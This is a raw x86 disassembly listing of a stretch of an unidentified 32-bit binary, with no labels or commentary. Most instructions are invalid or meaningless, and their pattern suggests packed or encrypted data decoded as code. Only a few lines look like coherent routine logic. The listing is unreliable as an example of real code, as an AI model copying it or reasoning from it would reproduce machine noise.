  40cd95:	fisubr WORD PTR [ebp-0x6]
  40cd98:	push   esp
  40cd99:	xor    eax,0xe1400d3d
  40cd9e:	pop    edi
  40cd9f:	addr16 pushf 
  40cda1:	hlt    
  40cda2:	add    BYTE PTR [eax-0xe],bh
  40cda5:	pop    eax
  40cda6:	mov    eax,0x9fee1229
  40cdab:	test   BYTE PTR [edi-0x2f],al
  40cdae:	shr    BYTE PTR [ecx-0x224a7b09],1
  40cdb4:	sbb    al,0x2d
  40cdb6:	out    dx,eax
  40cdb7:	add    bh,BYTE PTR [edi+0x7c19f7ba]
  40cdbd:	call   0xf987:0x82f38a38
  40cdc4:	int    0xcd
  40cdc6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cdc7:	or     al,0x6c
  40cdc9:	rcl    BYTE PTR [ebp+0x48],0x6c
  40cdcd:	dec    edx
  40cdce:	dec    eax
  40cdcf:	cmp    DWORD PTR [eax],edi
  40cdd1:	xchg   edi,eax
  40cdd2:	cmc    
  40cdd3:	js     0x40ce2f
  40cdd5:	outs   dx,BYTE PTR ds:[esi]
  40cdd6:	xchg   edx,eax
  40cdd7:	fst    st(0)
  40cdd9:	dec    edi
  40cdda:	mov    eax,0x4bdbc901
  40cddf:	or     DWORD PTR [edi-0x339111ff],ebp
  40cde5:	(bad)
  40cde9:	ror    DWORD PTR [ebx+0x7746a709],0x87
  40cdf0:	fimul  WORD PTR [ebp+0x2b]
  40cdf3:	cmc    
  40cdf4:	leave  
  40cdf5:	pop    ebx
  40cdf6:	push   0x15
  40cdf8:	jne    0x40cda6
  40cdfa:	fisttp QWORD PTR [edi+edi*4-0x2e55a223]
  40ce01:	push   eax
  40ce02:	repnz sbb dl,bl
  40ce05:	inc    edx
  40ce06:	add    edi,DWORD PTR [ecx]
  40ce08:	jnp    0x40cde3
  40ce0a:	cmp    BYTE PTR [ecx-0xeb6ce7c],0xb0
  40ce11:	cdq    
  40ce12:	mov    dl,0x28
  40ce14:	loop   0x40ce04
  40ce16:	mul    BYTE PTR [ebp-0x13]
  40ce19:	push   ds
  40ce1a:	and    BYTE PTR [esi+ebp*2],cl
  40ce1d:	cmp    ch,al
  40ce1f:	dec    edi
  40ce20:	or     eax,0x6fb52e5e
  40ce25:	sbb    eax,0x6504d9b7
  40ce2a:	jo     0x40ce25
  40ce2c:	xor    BYTE PTR [ecx],dl
  40ce2e:	and    al,0x3d
  40ce30:	xchg   edi,eax
  40ce31:	cdq    
  40ce32:	scas   al,BYTE PTR es:[edi]
  40ce33:	inc    esi
  40ce34:	sbb    cl,bl
  40ce36:	mov    DWORD PTR [edx-0x66],edi
  40ce39:	or     bl,dh
  40ce3b:	jmp    0xc012441c
  40ce40:	test   eax,0x37ef4ed6
  40ce45:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ce46:	std    
  40ce47:	mov    ecx,0xa854d166
  40ce4c:	bound  esp,QWORD PTR [edi+0x79]
  40ce4f:	not    BYTE PTR [ebx+0x74]
  40ce52:	adc    al,0xe5
  40ce54:	sti    
  40ce55:	mov    ebx,0xf7259b1e
  40ce5a:	adc    BYTE PTR [esi+ebp*8],cl
  40ce5d:	pop    ds
  40ce5e:	pusha  
  40ce5f:	and    dh,cl
  40ce61:	mov    ecx,0xd6b1384b
  40ce66:	test   al,0x6f
  40ce68:	inc    esi
  40ce69:	push   ds
  40ce6a:	aam    0x3b
  40ce6c:	mov    dh,0x69
  40ce6e:	rcr    esp,cl
  40ce70:	pop    esi
  40ce71:	int3   
  40ce72:	lods   eax,DWORD PTR ds:[esi]
  40ce73:	ss cld 
  40ce75:	or     ah,bl
  40ce77:	outs   dx,BYTE PTR ds:[esi]
  40ce78:	pop    edi
  40ce79:	sub    al,BYTE PTR [ecx+eax*2-0x72]
  40ce7d:	iret   
  40ce7e:	scas   al,BYTE PTR es:[edi]
  40ce7f:	inc    esi
  40ce80:	in     eax,dx
  40ce81:	push   ds
  40ce82:	mov    dl,0x2a
  40ce84:	cmp    al,0xfd
  40ce86:	dec    ecx
  40ce87:	mov    ch,BYTE PTR [ebx+0x72]
  40ce8a:	in     al,0xc4
  40ce8c:	dec    esi
  40ce8d:	mov    ds:0x69837d6a,al
  40ce92:	xlat   BYTE PTR ds:[ebx]
  40ce93:	lods   eax,DWORD PTR ds:[esi]
  40ce94:	push   esi
  40ce95:	fst    QWORD PTR [ecx+0x57]
  40ce98:	inc    ecx
  40ce99:	pop    ebx
  40ce9a:	fwait
  40ce9b:	pusha  
  40ce9c:	out    0x73,eax
  40ce9e:	hlt    
  40ce9f:	aaa    
  40cea0:	ret    0x75d6
  40cea3:	pop    edi
  40cea4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cea5:	scas   al,BYTE PTR es:[edi]
  40cea6:	pop    ebx
  40cea7:	adc    DWORD PTR ds:[eax-0x19],0x70751866
  40ceaf:	int3   
  40ceb0:	mov    WORD PTR [ebp-0x41fb0fdb],ss
  40ceb6:	div    edi
  40ceb8:	jnp    0x40ce55
  40ceba:	sar    edi,1
  40cebc:	pop    ecx
  40cebd:	ret    0xcf36
  40cec0:	inc    esi
  40cec1:	neg    BYTE PTR [eax+edx*4+0x6866c9c6]
  40cec8:	mov    bl,0xe3
  40ceca:	iret   
  40cecb:	push   0x5c
  40cecd:	or     eax,0x768ea0aa
  40ced2:	mov    eax,DWORD PTR [esi-0x5d47dbf7]
  40ced8:	pop    es
  40ced9:	scas   al,BYTE PTR es:[edi]
  40ceda:	popf   
  40cedb:	mov    ebp,0x27c965f
  40cee0:	mov    edi,0x91004267
  40cee5:	inc    edx
  40cee6:	cmp    BYTE PTR [edx-0x58],dl
  40cee9:	and    eax,0xb90d20d8
  40ceee:	repz add ch,BYTE PTR [esi+0x7f]
  40cef2:	shl    BYTE PTR [ecx],0xa6
  40cef5:	push   edi
  40cef6:	(bad)
  40cef9:	or     al,0xdd
  40cefb:	jl     0x40cf29
  40cefd:	fmul   QWORD PTR [esi+0x7e]
  40cf00:	fisubr DWORD PTR [eax+0x1]
  40cf03:	repnz push esp
  40cf05:	xchg   edi,eax
  40cf06:	sub    eax,0x839a4c5e
  40cf0b:	mov    ecx,0x3bab643e
  40cf10:	data16 (bad) 
  40cf12:	sti    
  40cf13:	sbb    dl,BYTE PTR [eax+0x7d47eebb]
  40cf19:	push   0xffffffcf
  40cf1b:	push   esp
  40cf1c:	fnsave [edi+0x1cb690ae]
  40cf22:	iret   
  40cf23:	enter  0xf93a,0xf6
  40cf27:	aaa    
  40cf28:	and    eax,DWORD PTR ds:0x11db0b9a
  40cf2e:	sub    BYTE PTR [ebp-0x42],cl
  40cf31:	pushf  
  40cf32:	enter  0xb4d7,0x6a
  40cf36:	mov    dl,0x7
  40cf38:	call   0x9138ce28
  40cf3d:	adc    DWORD PTR [edx-0x60],0xc7846344
  40cf44:	xchg   edx,eax
  40cf45:	inc    eax
  40cf46:	inc    esp
  40cf47:	popa   
  40cf48:	adc    DWORD PTR [esi],esp
  40cf4a:	fcom   DWORD PTR [esi]
  40cf4c:	xchg   ebp,eax
  40cf4d:	push   ebx
  40cf4e:	add    BYTE PTR [ebx],bh
  40cf50:	pop    ds
  40cf51:	dec    eax
  40cf52:	cwde   
  40cf53:	stos   BYTE PTR es:[edi],al
  40cf54:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cf55:	sbb    eax,0x19009f29
  40cf5a:	fdiv   QWORD PTR [ebp+0x72]
  40cf5d:	(bad)  
  40cf5e:	pop    ss
  40cf5f:	shr    ch,0xc8
  40cf62:	inc    esp
  40cf63:	sbb    ebp,DWORD PTR [esp+ebx*8+0x62f78c2]
  40cf6a:	adc    DWORD PTR [eax+0x4e],esp
  40cf6d:	sbb    al,0xc6
  40cf6f:	ds push edx
  40cf71:	jg     0x40cfea
  40cf73:	fldcw  WORD PTR ds:0x2b90d530
  40cf79:	popa   
  40cf7a:	and    edx,ebx
  40cf7c:	cmp    eax,edi
  40cf7e:	pop    eax
  40cf7f:	and    DWORD PTR [edi],esp
  40cf81:	ret    
  40cf82:	sbb    al,0x5d
  40cf84:	lods   eax,DWORD PTR ds:[esi]
  40cf85:	arpl   WORD PTR [edx],ax
  40cf87:	jae    0x40cf55
  40cf89:	jecxz  0x40d000
  40cf8b:	gs pop esp
  40cf8d:	retf   0xb37c
  40cf90:	inc    ecx
  40cf91:	mov    al,0x9d
  40cf93:	xor    eax,0xac518e86
  40cf98:	mov    ds:0x53ce3725,al
  40cf9d:	cwde   
  40cf9e:	push   es
  40cf9f:	inc    edi
  40cfa0:	adc    dl,dh
  40cfa2:	sahf   
  40cfa3:	pop    ds
  40cfa4:	fild   DWORD PTR [eax]
  40cfa6:	mov    dh,0xe5
  40cfa8:	daa    
  40cfa9:	out    0x5,al
  40cfab:	call   0x6559c0ce
  40cfb0:	lods   eax,DWORD PTR ds:[esi]
  40cfb1:	inc    ecx
  40cfb2:	out    0x82,eax
  40cfb4:	lock sub BYTE PTR [ebx+0x63],cl
  40cfb8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cfb9:	fimul  DWORD PTR [eax]
  40cfbb:	sbb    esi,DWORD PTR [eax-0x7dd514be]
  40cfc1:	test   BYTE PTR [esp+ebx*4-0x56758880],ah
  40cfc8:	ret    
  40cfc9:	loop   0x40cfc0
  40cfcb:	xor    ebx,DWORD PTR [edi+edx*1+0x7256f372]
  40cfd2:	daa    
  40cfd3:	lds    esi,FWORD PTR [eax]
  40cfd5:	jbe    0x40cf80
  40cfd7:	repz xor BYTE PTR [ecx+0x4a],ah
  40cfdb:	dec    ebx
  40cfdc:	and    BYTE PTR ss:[eax],dl
  40cfdf:	fadd   st(4),st
  40cfe1:	jge    0x40d03c
  40cfe3:	imul   esi,edi,0xffffff96
  40cfe6:	out    0x18,al
  40cfe8:	add    BYTE PTR [edi],dh
  40cfea:	mov    edi,ds
  40cfec:	mov    bh,0x55
  40cfee:	rcr    DWORD PTR [edi],cl
  40cff0:	mov    DWORD PTR [esi],0x8782bd9e
  40cff6:	imul   esp,DWORD PTR [esi+0x15],0x1
  40cffa:	loopne 0x40d043
  40cffc:	jg     0x40d041
  40cffe:	adc    edx,edx
  40d000:	cmp    DWORD PTR [ecx],edx
  40d002:	xchg   edi,eax
  40d003:	(bad)  
  40d004:	imul   eax,DWORD PTR [edx],0x4ff79a1d
  40d00a:	(bad)  
  40d00b:	(bad)  
  40d00c:	xor    edx,DWORD PTR [ebx-0x1c]
  40d00f:	lds    eax,FWORD PTR [ebp-0x16c6d26]
  40d015:	cdq    
  40d016:	retf   0x2c0a
  40d019:	lods   al,BYTE PTR ds:[esi]
  40d01a:	sub    al,0x97
  40d01c:	jb     0x40d031
  40d01e:	push   ebp
  40d01f:	mov    dh,0xda
  40d021:	xchg   ebx,eax
  40d022:	shl    DWORD PTR ds:0x9cd63384,1
  40d028:	push   ecx
  40d029:	push   ebp
  40d02a:	xrelease mov DWORD PTR [ebx],edi
  40d02d:	ins    BYTE PTR es:[edi],dx
  40d02e:	lds    eax,FWORD PTR [eax]
  40d030:	mov    ?,WORD PTR [esi+0x483ccf7a]
  40d036:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d037:	mov    bh,0x99
  40d039:	loope  0x40d0ba
  40d03b:	add    DWORD PTR [esi],esi
  40d03d:	dec    esp
  40d03e:	cwde   
  40d03f:	jmp    0x5e40:0x85feace2
  40d046:	mov    ch,0xee
  40d048:	ret    0x8562
  40d04b:	add    eax,0xebee9358
  40d050:	sbb    dl,bh
  40d052:	xchg   esp,eax
  40d053:	arpl   WORD PTR [ebp+eax*8+0x6817c0f4],si
  40d05a:	sti    
  40d05b:	inc    ecx
  40d05c:	in     eax,0xc5
  40d05e:	mov    eax,0xa524d8e1
  40d063:	mov    al,BYTE PTR [ebp+ecx*1+0x28]
  40d067:	not    DWORD PTR [eax+0x30]
  40d06a:	std    
  40d06b:	aad    0xa1
  40d06d:	je     0x40cffc
  40d06f:	fsubrp st(6),st
  40d071:	test   BYTE PTR [esi-0x4e50ff9a],cl
  40d077:	mov    cl,0x2d
  40d079:	ror    BYTE PTR [eax+0x27ebbec9],0x4b
  40d080:	repnz sub eax,0xf5f4a2b1
  40d086:	stc    
  40d087:	push   esp
  40d088:	pop    edi
  40d089:	js     0x40d04f
  40d08b:	xchg   esi,eax
  40d08c:	and    DWORD PTR [edi-0x4b],ebx
  40d08f:	add    BYTE PTR [eax+0x3e],bl
  40d092:	gs jmp 0xa335038f
  40d098:	pop    ebp
  40d099:	aad    0x49
  40d09b:	xchg   esi,eax
  40d09d:	mov    cl,0xad
  40d09f:	jo     0x40d058
  40d0a1:	dec    esi
  40d0a2:	inc    edx
  40d0a3:	lods   eax,DWORD PTR ds:[esi]
  40d0a4:	cwde   
  40d0a5:	inc    ecx
  40d0a6:	and    dh,ah
  40d0a8:	js     0x40d08a
  40d0aa:	lea    edx,[edi]
  40d0ac:	fsub   DWORD PTR [esi+eax*2-0x2c]
  40d0b0:	dec    esp
  40d0b1:	cmp    ebp,DWORD PTR [eax]
  40d0b3:	(bad)  
  40d0b4:	sub    al,0xda
  40d0b6:	dec    esp
  40d0b7:	icebp  
  40d0b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d0b9:	enter  0x56b3,0xa1
  40d0bd:	lahf   
  40d0be:	(bad)  
  40d0bf:	cdq    
  40d0c0:	test   BYTE PTR [edi],dl
  40d0c2:	or     DWORD PTR [ebp+0x5a728ec],esp
  40d0c8:	and    ecx,DWORD PTR [edx]
  40d0ca:	push   ds
  40d0cb:	mov    edx,0x2ba488c9
  40d0d0:	fmul   DWORD PTR [ebp-0x25]
  40d0d3:	dec    eax
  40d0d4:	pop    ecx
  40d0d5:	lods   al,BYTE PTR ds:[esi]
  40d0d6:	es into 
  40d0d8:	xor    eax,esi
  40d0da:	xor    DWORD PTR ds:0x42a296,0x42a2e6
  40d0e4:	add    eax,edi
  40d0e6:	mov    DWORD PTR ds:0x42a2ce,0x1ae8
  40d0f0:	cmp    ecx,eax
  40d0f2:	je     0x413d1d
  40d0f8:	xor    DWORD PTR ds:0x42a26e,0x42a2e6
  40d102:	push   DWORD PTR [ebp-0x14]
  40d105:	push   DWORD PTR [ebp+0x8]
  40d108:	call   0x425094
  40d10d:	sub    DWORD PTR ds:0x42a266,edi
  40d113:	jmp    0x40f48f
  40d118:	scas   eax,DWORD PTR es:[edi]
  40d119:	cdq    
  40d11a:	and    DWORD PTR [ebx],edx
  40d11c:	add    DWORD PTR [ebx+0x10ba9981],ecx
  40d122:	cwde   
  40d123:	int    0x53
  40d125:	jns    0x40d0b0
  40d127:	popa   
  40d128:	ror    ah,cl
  40d12a:	add    DWORD PTR [ebx-0x7c7ca1de],0x63
  40d131:	push   0x6c
  40d133:	sbb    eax,0x99d273bb
  40d138:	shl    BYTE PTR [edi-0x6ad26956],1
  40d13e:	lods   eax,DWORD PTR ds:[esi]
  40d13f:	mov    DWORD PTR [edx],edx
  40d141:	cwde   
  40d142:	lods   al,BYTE PTR ds:[esi]
  40d143:	mov    edx,0x60dbc70d
  40d148:	rcr    DWORD PTR [ecx],1
  40d14a:	add    edi,DWORD PTR [edx]
  40d14c:	fisub  WORD PTR [ecx]
  40d14e:	dec    ebp
  40d14f:	add    cl,BYTE PTR [ebx]
  40d151:	imul   esi,DWORD PTR [ebx-0x4f],0x81845ad6
  40d158:	mov    DWORD PTR [edx-0x7a2faa40],0xd1e13c74
  40d162:	inc    esp
  40d163:	in     al,0xdf
  40d165:	add    al,0xce
  40d167:	mov    ah,BYTE PTR [ebp-0x4f0184b]
  40d16d:	out    dx,al
  40d16e:	es lahf 
  40d170:	loop   0x40d192
  40d172:	outs   dx,BYTE PTR ds:[esi]
  40d173:	cmp    BYTE PTR [esi],ah
  40d175:	sar    BYTE PTR [ecx],cl
  40d177:	js     0x40d152
  40d179:	addr16 (bad) 
  40d17b:	(bad)  
  40d17c:	mov    ch,BYTE PTR [ebp+ebx*8+0x628503ae]
  40d183:	les    esp,FWORD PTR [eax]
  40d185:	and    eax,0xeb8ef94c
  40d18a:	mov    bh,0xe6
  40d18c:	push   es
  40d18d:	lods   al,BYTE PTR ds:[esi]
  40d18e:	std    
  40d18f:	test   eax,0x771e5db8
  40d194:	fwait
  40d195:	pop    edi
  40d196:	jle    0x40d14e
  40d198:	adc    ebp,DWORD PTR [edi+0x41adbc79]
  40d19e:	loopne 0x40d130
  40d1a0:	xchg   esi,eax
  40d1a1:	pop    edi
  40d1a2:	in     eax,0x3a
  40d1a4:	(bad)  
  40d1a5:	(bad)  
  40d1a6:	retf   0x1ce7
  40d1a9:	dec    edx
  40d1aa:	or     DWORD PTR [edi+eax*2],ecx
  40d1ad:	ins    DWORD PTR es:[edi],dx
  40d1ae:	leave  
  40d1af:	punpcklwd mm6,DWORD PTR [ecx]
  40d1b2:	xchg   ebp,eax
  40d1b3:	mov    ss,edi
  40d1b5:	mov    bh,0xea
  40d1b7:	mov    dl,0xae
  40d1b9:	mov    ?,esi
  40d1bb:	hlt    
  40d1bc:	(bad)  
  40d1bd:	cmp    eax,0xb859d2f5
  40d1c2:	mov    ebx,0xce01e154
  40d1c7:	sbb    BYTE PTR [edi+edi*1],dh
  40d1ca:	(bad)  
  40d1cb:	cdq    
  40d1cc:	retf   0x7310
  40d1cf:	jge    0x40d24a
  40d1d1:	bound  eax,QWORD PTR [eax*1+0x8d0a058]
  40d1d8:	push   ecx
  40d1d9:	fstp   QWORD PTR [edi+0x57]
  40d1dc:	and    BYTE PTR [ecx+0x14],dl
  40d1df:	mov    edx,0x35762bde
  40d1e4:	xchg   ebp,eax
  40d1e5:	jge    0x40d25b
  40d1e7:	sub    DWORD PTR [edx-0x33ada6e],edi
  40d1ed:	scas   eax,DWORD PTR es:[edi]
  40d1ee:	fwait
  40d1ef:	out    0x55,eax
  40d1f1:	mov    WORD PTR [edx-0x28051655],cs
  40d1f7:	or     BYTE PTR [eax-0x25],bl
  40d1fa:	sbb    DWORD PTR [esi+0x72],ebp
  40d1fd:	cwde   
  40d1fe:	xor    dh,BYTE PTR [ecx-0x72]
  40d201:	dec    ebx
  40d202:	nop
  40d203:	inc    esi
  40d204:	bound  esi,QWORD PTR [ebx]
  40d206:	hlt    
  40d207:	jmp    0x2b59:0xd38ccb4
  40d20e:	dec    eax
  40d20f:	fucomip st,st(2)
  40d211:	jmp    0x40d275
  40d213:	mov    bl,bl
  40d215:	mov    dl,0xbe
  40d217:	aad    0x2c
  40d219:	call   0xc2f619ea
  40d21e:	pop    edx
  40d21f:	adc    bh,BYTE PTR [esi]
  40d221:	fadd   DWORD PTR [esi+0x3cf5ce06]
  40d227:	mov    ebx,ds
  40d229:	mov    edi,0x91366499
  40d22e:	dec    edx
  40d22f:	mov    ch,BYTE PTR [ecx]
  40d231:	xchg   ebx,eax
  40d232:	cwde   
  40d233:	es pushf 
  40d235:	imul   ecx,DWORD PTR [ebx-0x18],0x67d6b07e
  40d23c:	cli    
  40d23d:	pop    eax
  40d23e:	stc    
  40d23f:	xchg   ecx,eax
  40d240:	cmp    edi,DWORD PTR [edi]
  40d242:	out    dx,eax
  40d243:	sbb    ebx,ebx
  40d245:	mov    bh,0x42
  40d247:	fmulp  st(2),st
  40d249:	mov    bl,0xe5
  40d24b:	test   al,0xc9
  40d24d:	sbb    ebp,edi
  40d24f:	sbb    ebx,eax
  40d251:	sbb    al,0xb3
  40d253:	pop    ds
  40d254:	or     BYTE PTR [esi+0x47a19327],dl
  40d25a:	fstp   TBYTE PTR [eax+0x70118575]
  40d260:	enter  0x9067,0x4
  40d264:	xchg   edi,eax
  40d266:	pop    di
  40d268:	cmp    dl,BYTE PTR [ebx-0x2a4f050a]
  40d26e:	popa   
  40d26f:	mov    al,ds:0x49ccb770
  40d274:	dec    edx
  40d275:	add    ch,BYTE PTR [eax-0x3f]
  40d278:	inc    esp
  40d279:	inc    eax
  40d27a:	(bad)  
  40d27b:	retf   0xce80
  40d27e:	out    0xb0,eax
  40d280:	inc    BYTE PTR [esi-0x28]
  40d283:	jae    0x40d2ff
  40d285:	pop    ds
  40d286:	int    0x7
  40d288:	pop    ecx
  40d289:	scas   al,BYTE PTR es:[edi]
  40d28a:	xchg   BYTE PTR [edi-0x21],dl
  40d28d:	add    dl,BYTE PTR [ebp+0x5a55fe60]
  40d293:	loop   0x40d2ae
  40d295:	call   0xe3a8de69
  40d29a:	add    al,0x80
  40d29c:	sahf   
  40d29d:	xchg   ebp,eax
  40d29e:	mov    edx,0x7e42e082
  40d2a3:	sbb    dl,BYTE PTR [ebp+0x4819e489]
  40d2a9:	add    eax,0xfa0b725d
  40d2ae:	lds    ebx,FWORD PTR [edx+edx*8]
  40d2b1:	mov    esp,0xdd466f0d
  40d2b6:	(bad)  
  40d2b7:	dec    edi
  40d2b8:	ficomp WORD PTR [ebx+0x370beda9]
  40d2be:	and    ebp,DWORD PTR [edi-0x11774342]
  40d2c4:	push   0xd73d9061
  40d2c9:	ins    DWORD PTR es:[edi],dx
  40d2ca:	stos   BYTE PTR es:[edi],al
  40d2cb:	test   BYTE PTR [edx-0x55],ah
  40d2ce:	shl    DWORD PTR [edi+0x60303ac8],cl
  40d2d4:	dec    DWORD PTR [edi-0x3ee232ca]
  40d2da:	and    ah,ah
  40d2dc:	std    
  40d2dd:	test   BYTE PTR [esi+0x1b3336cd],al
  40d2e3:	and    DWORD PTR [eax+ebx*8],esi
  40d2e6:	hlt    
  40d2e7:	test   al,0xd
  40d2e9:	push   edi
  40d2ea:	js     0x40d365
  40d2ec:	rol    esp,0x6a
  40d2ef:	ins    BYTE PTR es:[edi],dx
  40d2f0:	mul    BYTE PTR [esi+eax*8-0x4]
  40d2f4:	cmp    dl,dl
  40d2f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d2f7:	jnp    0x40d28f
  40d2f9:	ror    BYTE PTR [ebx+eiz*1],0x3
  40d2fd:	mov    edx,0x3f2622d8
  40d302:	push   ebx
  40d303:	mov    cl,0x71
  40d305:	in     eax,0x4b
  40d307:	xchg   ebp,eax
  40d308:	outs   dx,DWORD PTR ds:[esi]
  40d309:	aas    
  40d30a:	adc    edi,ecx
  40d30c:	into   
  40d30d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d30e:	jb     0x40d2dd
  40d310:	in     eax,0x7e
  40d312:	scas   eax,DWORD PTR es:[edi]
  40d313:	repnz inc edi
  40d315:	add    eax,0xaf0439d9
  40d31a:	jl     0x40d2a7
  40d31c:	jmp    0x40d323
  40d31e:	adc    DWORD PTR [edi+eax*1],esi
  40d321:	push   eax
  40d322:	sub    bl,dl
  40d324:	aas    
  40d325:	xchg   DWORD PTR [ebx+edx*2-0x743391f4],esp
  40d32c:	in     eax,dx
  40d32d:	xor    eax,0xdd4b5006
  40d332:	mov    al,0x4a
  40d334:	dec    eax
  40d335:	rcr    DWORD PTR [ebx+0x39],0xa5
  40d339:	cld    
  40d33a:	inc    ebp
  40d33b:	imul   edx,DWORD PTR [eax+0x7f],0xffffffce
  40d33f:	jmp    0xb99e8355
  40d344:	and    eax,0x7c609be6
  40d349:	lea    sp,[esi+0x5f]
  40d34d:	jmp    0xe02f:0xfab59e95
  40d354:	inc    ecx
  40d355:	jecxz  0x40d2ff
  40d357:	mov    bh,bh
  40d359:	push   ecx
  40d35a:	adc    eax,0xfd4b9d4d
  40d35f:	test   dh,ah
  40d361:	pop    ds
  40d362:	dec    ecx
  40d363:	cmp    edi,DWORD PTR [esi-0x2a]
  40d366:	inc    BYTE PTR [ebx]
  40d368:	call   0x9441d41c
  40d36d:	repz push esp
  40d36f:	sti    
  40d370:	sub    ecx,DWORD PTR [ebx]
  40d372:	in     eax,0xb4
  40d374:	pop    ebp
  40d375:	iret   
  40d376:	out    0xa6,al
  40d378:	xor    eax,0x8e2ed4dc
  40d37d:	xchg   esi,eax
  40d37e:	pop    ds
  40d37f:	mov    al,ds:0xc6223ba8
  40d384:	add    al,0x48
  40d386:	mov    esp,0xb953cc8b
  40d38b:	xor    eax,0xc473cb9c
  40d390:	in     al,dx
  40d391:	mov    cl,BYTE PTR [ebx+edi*1]
  40d394:	(bad)  
  40d396:	or     BYTE PTR [eax+0x461b5cb2],bh
  40d39c:	cmc    
  40d39d:	jo     0x40d327
  40d39f:	icebp  
  40d3a0:	xchg   edi,eax
  40d3a1:	pop    ecx
  40d3a2:	mov    esi,0xf6e144f5
  40d3a7:	cmp    al,0x4f
  40d3a9:	cmc    
  40d3aa:	mov    cl,0xab
  40d3ac:	add    esp,esp
  40d3ae:	push   ds
  40d3af:	scas   al,BYTE PTR es:[edi]
  40d3b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d3b1:	mov    ch,0x44
  40d3b3:	out    0x59,al
  40d3b5:	pop    edi
  40d3b6:	jg     0x40d416
  40d3b8:	in     al,dx
  40d3b9:	unpckhps xmm1,XMMWORD PTR [edi]
  40d3bc:	ins    DWORD PTR es:[edi],dx
  40d3bd:	pop    ebx
  40d3be:	dec    edi
  40d3bf:	mov    ecx,0x75f8928d
  40d3c4:	push   esi
  40d3c5:	cmp    BYTE PTR [eax+0x65],bl
  40d3c8:	sbb    dl,0x58
  40d3cb:	dec    ebp
  40d3cc:	fsubp  st(6),st
  40d3ce:	push   ss
  40d3cf:	jmp    0xb236daa5
  40d3d4:	cmp    al,0xba
  40d3d6:	(bad)
  40d3da:	lea    eax,[ecx+0x750c3d3c]
  40d3e0:	mov    ebx,0x3a888588
  40d3e5:	fsub   DWORD PTR [eax+0x27dd4be]
  40d3eb:	inc    eax
  40d3ec:	mov    edx,0xa969ea9e
  40d3f1:	loope  0x40d431
  40d3f3:	sbb    BYTE PTR ds:[esi+edx*8+0x5e],bh
  40d3f8:	jb     0x40d3b1
  40d3fa:	lods   eax,DWORD PTR ds:[esi]
  40d3fb:	in     eax,0x32
  40d3fd:	repz fidivr WORD PTR [ebx-0xf25535e]
  40d404:	ins    DWORD PTR es:[edi],dx
  40d405:	mov    esp,0x69933ead
  40d40a:	dec    ebp
  40d40b:	jnp    0x40d45f
  40d40d:	lods   eax,DWORD PTR ds:[esi]
  40d40e:	push   esp
  40d40f:	pop    edi
  40d410:	enter  0x71e0,0xe9
  40d414:	xor    edx,DWORD PTR [edx-0x7814a5d9]
  40d41a:	xchg   edi,eax
  40d41b:	out    dx,eax
  40d41c:	scas   al,BYTE PTR es:[edi]
  40d41d:	pop    ss
  40d41e:	xchg   DWORD PTR [ecx-0x61],edx
  40d421:	sub    BYTE PTR [edi],al
  40d423:	aaa    
  40d424:	jge    0x40d3b7
  40d426:	dec    edi
  40d427:	jge    0x40d3ee
  40d429:	xor    BYTE PTR ds:[esi+0xf],0xb8
  40d42e:	push   0xb0a9fdc6
  40d433:	loopne 0x40d446
  40d435:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d436:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d437:	jb     0x40d427
  40d439:	test   al,0x56
  40d43b:	mov    esi,0xc2e4611e
  40d440:	jle    0x40d4be
  40d442:	cmc    
  40d443:	scas   eax,DWORD PTR es:[edi]
  40d444:	test   DWORD PTR [edx+esi*8+0xf218075],0x726c923
  40d44f:	jbe    0x40d416
  40d451:	ret    0x30d7
  40d454:	or     BYTE PTR [ecx-0x80],ah
  40d457:	and    DWORD PTR [esi],ebx
  40d459:	ja     0x40d4a9
  40d45b:	pop    edi
  40d45c:	arpl   WORD PTR [ecx+0x4d],bp
  40d45f:	mov    edx,0x5c303e6
  40d464:	cdq    
  40d465:	call   0x7316d75c
  40d46a:	daa    
  40d46b:	pop    eax
  40d46c:	mov    edi,0xbab5a7ce
  40d471:	mov    dl,0x4d
  40d473:	jmp    0x40d40e
  40d475:	dec    edx
  40d476:	retf   0xf507
  40d479:	mov    edi,esp
  40d47b:	mov    ds:0x88191ce1,al
  40d480:	push   0x7be511de
  40d485:	fidivr DWORD PTR [eax-0xc]
  40d488:	and    al,0x88
  40d48a:	fiadd  DWORD PTR [ecx+edi*1-0x5a73944e]
  40d491:	mov    BYTE PTR [edx],0xc2
  40d494:	or     al,0xf0
  40d496:	cmovae ecx,DWORD PTR [eax+0x7e22007b]
  40d49d:	outs   dx,BYTE PTR ds:[esi]
  40d49e:	dec    ebx
  40d49f:	add    BYTE PTR [edx+0x32a1654b],bl
  40d4a5:	mov    eax,ds:0xf542b500
  40d4aa:	or     ebx,DWORD PTR [eax-0x18]
  40d4ad:	pop    ebp
  40d4ae:	and    bh,BYTE PTR [ecx-0x74bf987c]
  40d4b4:	out    0xf7,eax
  40d4b6:	mov    ebp,0xd81e9274
  40d4bb:	loopne 0x40d4ba
  40d4bd:	fisttp WORD PTR [ebx*1+0x3e721561]
  40d4c4:	enter  0xcfd1,0x74
  40d4c8:	add    BYTE PTR [ecx+0xe6a9bd7],ch
  40d4ce:	pop    ebp
  40d4cf:	mul    DWORD PTR [esi-0x72]
  40d4d2:	imul   esi,DWORD PTR [ebp+0xdc34c74],0xffffffca
  40d4d9:	fistp  QWORD PTR [edx-0x76]
  40d4dc:	jne    0x40d514
  40d4de:	cmp    al,0x8c
  40d4e0:	xchg   ebp,eax
  40d4e1:	lds    edi,FWORD PTR ds:[eax]
  40d4e4:	jns    0x40d554
  40d4e6:	aaa    
  40d4e7:	xlat   BYTE PTR ds:[ebx]
  40d4e8:	jmp    0x40d4e5
  40d4ea:	(bad)  
  40d4eb:	aad    0xd4
  40d4ed:	sbb    BYTE PTR [ebp+0x2e4fa815],0xbf
  40d4f4:	imul   edi,DWORD PTR [eax+0x38d14bc],0xffffff8f
  40d4fb:	out    0x34,eax
  40d4fd:	outs   dx,DWORD PTR ds:[esi]
